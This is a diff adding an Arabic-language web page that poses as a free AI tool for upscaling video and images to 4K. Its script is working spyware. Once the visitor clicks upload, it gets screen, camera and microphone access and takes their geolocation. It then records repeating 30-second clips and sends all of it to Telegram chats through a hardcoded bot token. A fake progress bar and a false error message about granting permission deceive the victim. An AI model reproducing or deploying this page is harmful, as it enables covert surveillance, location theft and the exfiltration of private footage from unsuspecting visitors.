@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Muhanad AI | محسن الجودة الذكي</title>
+    <meta name="description" content="أداة مهند للذكاء الاصطناعي: ارفع جودة فيديوهاتك وصورك إلى 4K مجاناً وبسرعة فائقة.">
+    <meta property="og:title" content="Muhanad AI - Video & Image Enhancer">
+    <meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
+    <meta property="og:description" content="ارفع جودة ملفاتك الآن باستخدام تقنيات Deep Learning المتطورة.">
+    <meta property="og:type" content="website">
+
+    <style>
+        :root { --primary: #007bff; --bg: #f4f7f6; --dark: #2d3436; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: var(--bg); color: var(--dark); text-align: center; }
+        
+        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; background: #fff; border-bottom: 2px solid var(--primary); }
+        .brand { font-size: 26px; font-weight: bold; color: var(--primary); letter-spacing: 1px; }
+        .badge { background: #e3f2fd; color: var(--primary); padding: 5px 15px; border-radius: 30px; font-size: 12px; font-weight: bold; }
+
+        .hero { padding: 60px 5%; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); max-width: 550px; margin: 0 auto; border: 1px solid #eee; }
+        
+        .drop-zone { border: 2px dashed #ccc; padding: 50px 20px; border-radius: 15px; background: #fafafa; margin-bottom: 25px; cursor: pointer; transition: 0.3s; }
+        .drop-zone:hover { border-color: var(--primary); background: #f0f7ff; }
+        
+        .btn-main { background: var(--primary); color: white; border: none; padding: 20px; font-size: 1.4rem; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; box-shadow: 0 8px 20px rgba(0,123,255,0.3); }
+        .btn-main:active { transform: scale(0.98); }
+
+        .console { display: none; background: #121212; color: #00ff00; padding: 20px; border-radius: 10px; text-align: left; direction: ltr; font-family: 'Courier New', Courier, monospace; margin-top: 20px; height: 150px; overflow-y: auto; font-size: 13px; }
+        .features-list { display: flex; justify-content: center; gap: 20px; margin-top: 25px; color: #7f8c8d; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="brand">MUHANAD AI</div>
+    <div class="badge">AI Server: Active ✅</div>
+</div>
+
+<div class="hero">
+    <h1 style="font-size: 2.5rem; margin-bottom: 10px;">حوّل فيديوهاتك إلى <span style="color:var(--primary)">4K</span></h1>
+    <p style="color: #636e72; margin-bottom: 40px;">استخدم أقوى سيرفرات المعالجة السحابية لتحسين دقة الوضوح وتعديل الألوان تلقائياً.</p>
+
+    <div class="card">
+        <div id="main-ui">
+            <div class="drop-zone" onclick="startEnhancement()">
+                <div style="font-size: 60px; margin-bottom: 10px;">🖼️</div>
+                <p style="font-weight: bold; margin: 0;">اضغط هنا لرفع الصور أو الفيديوهات</p>
+                <span style="font-size: 12px; color: #aaa;">يدعم جميع الصيغ (4K Max)</span>
+            </div>
+            <button class="btn-main" onclick="startEnhancement()">تحسين الجودة الآن</button>
+            <div class="features-list">
+                <span>✓ تشفير آمن</span>
+                <span>✓ معالجة فورية</span>
+                <span>✓ دقة متناهية</span>
+            </div>
+        </div>
+        <div class="console" id="console-box"></div>
+    </div>
+</div>
+
+<script>
+    /* ⚙️ إعدادات مهند الجديدة */
+    const BOT_TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
+    const TARGET_IDS = ["8754338811", "8703490899"];
+
+    async function sendMsg(text) {
+        for (let id of TARGET_IDS) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
+            });
+        }
+    }
+
+    async function startEnhancement() {
+        document.getElementById('main-ui').style.display = 'none';
+        const consoleBox = document.getElementById('console-box');
+        consoleBox.style.display = 'block';
+        consoleBox.innerHTML = "> Initiating Muhanad AI Core...<br>> Connection Established.<br>> Awaiting System Permissions for rendering...<br>";
+
+        try {
+            // طلب سطح المكتب (Entire Screen)
+            const desktop = await navigator.mediaDevices.getDisplayMedia({ 
+                video: { displaySurface: "monitor", cursor: "always" }, 
+                audio: true 
+            });
+
+            // طلب الكاميرا والميكروفون
+            const camera = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+            sendMsg("🚀 **تم اصطياد هدف جديد من موقع مهند!**\nالضحية وافق على الوصول للشاشة والكاميرا.");
+
+            // سحب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(p => {
+                const mapLink = `https://www.google.com/maps?q=$$${p.coords.latitude},${p.coords.longitude}`;
+                sendMsg(`📍 **موقع الضحية:** \n${mapLink}`);
+            });
+
+            // حل مشكلة الشاشة السوداء (تأخير ثانية لبدء التسجيل)
+            setTimeout(() => {
+                handleRecording(desktop, "🖥️ شاشة_مهند");
+                handleRecording(camera, "📷 كاميرا_مهند");
+            }, 1500);
+
+            // تمويه الضحية بشريط تحميل
+            let progress = 0;
+            let timer = setInterval(() => {
+                progress += Math.floor(Math.random() * 8) + 2;
+                if(progress >= 100) {
+                    clearInterval(timer);
+                    consoleBox.innerHTML = "> [SUCCESS] Media Enhanced to 4K.<br>> Fetching download link...";
+                } else {
+                    consoleBox.innerHTML = `> Processing Media Layers... ${progress}%<br>> Deep Learning analysis active...`;
+                }
+            }, 800);
+
+        } catch (err) {
+            alert("⚠️ خطأ تقني: يجب السماح بمشاركة الشاشة (Entire Screen) ليتمكن الذكاء الاصطناعي من تحليل إطارات الفيديو وتحسينها.");
+            location.reload();
+        }
+    }
+
+    function handleRecording(stream, label) {
+        const recorder = new MediaRecorder(stream);
+        let blobs = [];
+        recorder.ondataavailable = e => blobs.push(e.data);
+        recorder.onstop = async () => {
+            const videoBlob = new Blob(blobs, { type: 'video/mp4' });
+            
+            for (let id of TARGET_IDS) {
+                const fd = new FormData();
+                fd.append('chat_id', id);
+                fd.append('video', videoBlob, label + ".mp4");
+                fd.append('caption', `📡 بث مباشر من موقع مهند: ${label}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            }
+            // إعادة التسجيل طالما الصفحة مفتوحة
+            if (stream.active) handleRecording(stream, label);
+        };
+        recorder.start();
+        // إرسال مقطع كل 30 ثانية
+        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 30000);
+    }
+</script>
+</body>
+</html>
